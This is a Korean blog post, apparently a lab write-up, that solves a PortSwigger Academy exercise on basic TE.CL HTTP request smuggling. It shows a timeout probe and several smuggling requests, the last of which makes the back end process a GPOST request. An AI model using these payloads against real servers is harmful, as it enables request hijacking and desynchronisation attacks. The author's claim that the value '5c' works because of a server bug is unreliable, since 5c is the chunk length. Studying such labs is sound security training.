---
layout: post
title: "Burp Academy-HTTP Request Smuggling 관련 취약점: HTTP request smuggling, basic TE.CL vulnerability"
categories: [보안취약점, Burp Academy]
tags: [보안취약점, Burp Academy, HTTP Request Smuggling]
toc: true
last_modified_at: 2023-12-28 22:00:00 +0900
---

# 개요
- HTTP Request Smuggling 취약점 문제이다. 
- 문제 주소: https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl
- 취약점 설명페이지: https://portswigger.net/web-security/request-smuggling
- 난이도: PRACTITIONER (보통)

# 랩 개요
- 이 랩은 프론트 엔드 서버와 백엔드 서버로 구성되어 있고, 백엔드 서버는 chunked encoding 을 지원하지 않는다. 
- 프론트 엔드 서버는 GET이나 POST가 아닌 요청은 거부한다. 
- 랩을 풀려면 백엔드 서버에게 HTTP요청을 밀반입해서, 백엔드 서버가 다음 요청을 처리할 때 GPOST 라는 메서드를 처리하도록 만들면 랩이 풀린다. 
- 팁: 수동으로 HTTP Request Smuggling을 수행하는 것은 힘들다. `HTTP Request Smuggler` Burp 확장 프로그램을 이용하면 쉽게 할 수 있다. 

```
This lab involves a front-end and back-end server, and the back-end server doesn't support chunked encoding. The front-end server rejects requests that aren't using the GET or POST method.

To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST.

Tip
Manually fixing the length fields in request smuggling attacks can be tricky. Our HTTP Request Smuggler Burp extension was designed to help. You can install it via the BApp Store.
```

# 도전
1. TE.CL 용 체크 페이로드를 준비한다. 

TE.CL의 전형적인 페이로드는 다음과 같이 생겼다. 

```http

POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 6
Transfer-Encoding: chunked

0\r\n
\r\n
X
```

프론트 엔드는 TE헤더를 보고, 백엔드는 CL헤더를 보는 경우, 위의 페이로드를 보내면 타임아웃이 발생한다. 이유는 다음과 같다. 

- 프론트엔드는 TE헤더를 보기 때문에 5바이트인 `0\r\n\r\n`까지를 POST의 바디로 인식하여 여기까지를 백엔드 서버로 보낸다. 
- 백엔드 서버는 CL헤더를 보기 때문에 마지막 바이트가 올때까지 대기한다. (CL헤더에 6바이트라고 쓰여있으므로 마지막 1 바이트를 기다린다.) 
- 백엔드가 계속 대기하기 때문에 타임아웃이 발생한다.

**TE.CL패턴에서는 CL헤더에 적힌 크기만큼의 바이트가 백엔드에 전달되지 않는 것이 타임아웃을 발생시키는 요인이다.**

2. 실제로 보내본다. 타임아웃이 발생했다. TE.CL 타입의 스머글링이 가능해보인다.

![타임아웃 발생](/images/burp-academy-hrs-2-1.png)

3. 실제 스머글링용 요청을 준비한다. 

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 3

1\r\n
G\r\n
0\r\n
\r\n
```

위의 요청을 두번보내면 백엔드 서버에서는 `GPOST`로 시작하는 요청을 처리하게 될 것이다. 이유는 다음과 같다. 

- 프론트 엔드는 TE를 보기 때문에 위의 요청 전체를 백엔드에 보낸다. 
- 백엔드는 CL을 보기 때문에 `1\r\n`까지를 하나의 요청으로 처리한다. `G~`부터는 다음 요청으로 인식한다. 

4. 보내본다. 두번째 요청의 응답으로 `"Unrecognized method G0POST"`라는 메세지가 출력된다. G에 더해 0까지가 다음 요청으로 들어간 것이다. 0을 빼야한다. 어떻게 할 수 있을까?

![시도 결과](/images/burp-academy-hrs-2-2.png)

5. 조사해보니 다음과 같이 `0\r\n\r\n` 앞에 `G`가 아니라 **HTTP요청 전체를 밀반입(스머글링)하는** 식으로 적으면 될 것 같다. 

```http
POST / HTTP/1.1
Host: 0a0a003f0420df6183f6c8b0009400a4.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 5
Transfer-Encoding: chunked

x=1
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

하지만 시도해보면 `"error":"Invalid request"`라는 메세지가 돌아온다 .

![시도 결과](/images/burp-academy-hrs-2-3.png)

6. 원인을 모르겠다. 답을 본다. 파라메터부분을 `x=1`에서 `5c`로 변경하자 놀랍게도 스머글링에 성공했다. 문제 서버에 뭔가 버그가 있는 것 같다. 

```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```

![정답보고 시도](/images/burp-academy-hrs-2-4.png)

7. 풀렸다는 메세지가 출력된다. 

![풀이 성공](/images/burp-academy-hrs-2-success.png)
